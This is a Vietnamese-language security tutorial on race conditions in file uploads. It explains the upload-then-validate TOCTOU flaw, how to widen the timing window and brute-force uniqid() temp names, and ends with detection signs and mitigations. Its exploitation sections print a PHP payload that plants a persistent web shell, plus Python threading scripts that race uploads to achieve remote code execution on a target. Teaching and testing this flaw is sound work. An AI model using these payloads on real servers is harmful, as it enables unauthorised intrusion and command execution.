# File Upload — Race Conditions

## Bản chất

Race condition trong file upload xảy ra khi có **khoảng thời gian** (time window) giữa lúc file được ghi lên filesystem và lúc validation/cleanup hoàn tất. Trong khoảng thời gian này, file tồn tại trên server trong trạng thái chưa được validate — nếu attacker kịp gửi request truy cập file, code có thể được thực thi trước khi server kịp xóa.

Đây là dạng **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability.

## Mô hình race condition điển hình

### Upload-then-validate flow (lỗi thiết kế)

```
Server flow (vulnerable):

    1. Nhận file upload
    2. Ghi file vào filesystem  ───────┐
    3. Validate file (extension,       │  ← Time window
       content, virus scan)            │     File tồn tại trên server
    4. Nếu invalid → XÓA file  ───────┘     nhưng chưa validate
    5. Nếu valid → giữ file

Attacker flow:

    1. Upload malicious file
    2. Ngay lập tức gửi request đến file ← Race: cần đến trước step 4
    3. File được execute → RCE
```

### So sánh với flow an toàn

```
Server flow (secure):

    1. Nhận file upload
    2. Ghi vào TEMP directory (sandboxed, không executable)
    3. Validate file
    4. Nếu valid → MOVE sang destination directory
    5. Nếu invalid → xóa temp file

    → Không có time window vì file chỉ ở executable location sau khi validate xong
```

## Khai thác Race Condition — Upload trực tiếp

### Điều kiện

1. Server ghi file vào web-accessible directory **trước** khi validate
2. Attacker biết hoặc đoán được URL/path file sau upload
3. Time window đủ lớn để gửi request (thường chỉ vài milliseconds)

### Kỹ thuật tấn công

**Bước 1**: Upload file chứa payload tự triển khai — web shell ghi file mới lên server:

```php
<?php
// Payload tự nhân bản: tạo file web shell thường trực
// Nếu execute thành công, web shell tồn tại ngay cả khi file gốc bị xóa
file_put_contents('/var/www/html/persistent_shell.php',
    '<?php system($_GET["cmd"]); ?>');
echo 'INSTALLED';
?>
```

**Bước 2**: Gửi upload request và access request song song (multi-threaded):

```python
import threading
import requests

TARGET = "http://target.com"

def upload():
    files = {'file': ('shell.php', '<?php system("id"); ?>')}
    requests.post(f"{TARGET}/upload", files=files)

def trigger():
    r = requests.get(f"{TARGET}/uploads/shell.php")
    if "uid=" in r.text:
        print(f"[+] RCE: {r.text}")

# Race nhiều lần
for _ in range(100):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=trigger)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

### Mở rộng time window

Nếu time window quá nhỏ, có thể kéo dài bằng cách:

| Kỹ thuật           | Cách thực hiện                                            |
| ------------------ | --------------------------------------------------------- |
| File lớn           | Upload file lớn (MB), để server mất thời gian xử lý       |
| Payload ở đầu file | Đặt code thực thi ở đầu, theo sau bằng padding bytes lớn  |
| Server load        | Gửi nhiều request đồng thời tạo load, làm chậm processing |
| Slow upload        | Gửi file với tốc độ chậm (chunked transfer)               |

### Cấu trúc file tối ưu cho race

```
[PHP payload thực thi]          ← Đầu file — được server đọc và execute ngay
[... megabytes of padding ...]  ← Phần còn lại — làm chậm quá trình validation
```

## Race Condition — URL-based Upload

### Cơ chế

Một số chức năng upload cho phép cung cấp **URL** thay vì file trực tiếp. Server sẽ `fetch` file từ URL đó, lưu tạm, rồi validate. Race condition xảy ra tương tự nhưng có thêm đặc điểm:

1. Server tạo temp directory với tên random
2. Fetch file từ URL → ghi vào temp directory
3. Validate
4. Move hoặc delete

### Khó khăn

Attacker không biết tên temp directory (random) → không thể gửi request trực tiếp.

### Bypass: Brute-force directory name

Nếu server dùng pseudo-random function yếu (ví dụ PHP `uniqid()`), có thể brute-force:

```
uniqid() = prefix + hex(microtime)
```

- `microtime()` dựa trên timestamp hiện tại
- Attacker biết thời điểm gửi request → phạm vi brute-force nhỏ
- Kết hợp với kéo dài processing time để mở rộng window

### Kéo dài processing time cho URL-based upload

| Kỹ thuật              | Mô tả                                             |
| --------------------- | ------------------------------------------------- |
| Large file            | Host file rất lớn trên attacker server            |
| Slow response         | Attacker server trả response rất chậm (slow drip) |
| Chunked transfer      | Gửi file theo chunks nhỏ, delay giữa các chunks   |
| Connection keep-alive | Giữ connection mở lâu                             |

## Race Condition — Virus Scan

### Cơ chế

Server upload file → ghi lên filesystem → chạy antivirus scan → xóa nếu phát hiện malware.

Quá trình scan mất thời gian (seconds) → time window rộng hơn đáng kể so với validation thông thường.

### Khai thác

Antivirus scan thường mất 1-5 giây → dễ race hơn:

```python
import requests
import threading
import time

def upload_and_race():
    # Upload
    files = {'file': ('shell.php', '<?php system("id"); ?>')}
    upload_thread = threading.Thread(
        target=lambda: requests.post("http://target/upload", files=files)
    )
    upload_thread.start()

    # Race — thử truy cập ngay lập tức và liên tục
    for _ in range(50):
        r = requests.get("http://target/uploads/shell.php")
        if r.status_code == 200 and "uid=" in r.text:
            print(f"[+] RCE achieved!")
            break
        time.sleep(0.05)

upload_and_race()
```

## Phát hiện Race Condition

Race condition khó phát hiện trong blackbox testing. Các dấu hiệu gợi ý:

| Dấu hiệu                                            | Ý nghĩa                                      |
| --------------------------------------------------- | -------------------------------------------- |
| File xuất hiện rồi biến mất                         | Server upload rồi xóa (upload-then-validate) |
| Response nhanh bất thường khi upload bị reject      | Validation xảy ra sau khi ghi file           |
| Source code leak cho thấy `move` + `unlink` pattern | Upload → validate → delete flow              |
| Server có antivirus/malware scanning                | Time window lớn do scan                      |
| Tính năng "upload from URL"                         | URL fetch tạo temp file                      |

## Mitigation patterns

| Pattern             | Mô tả                                                               |
| ------------------- | ------------------------------------------------------------------- |
| Validate-then-store | Validate trong memory/temp trước khi ghi vào destination            |
| Non-executable temp | Temp directory không có script execution                            |
| Atomic move         | Validate xong → atomic rename/move vào destination                  |
| Random filename     | Tên file random, attacker không đoán được URL                       |
| No direct access    | File không accessible trực tiếp — chỉ phục vụ qua download endpoint |
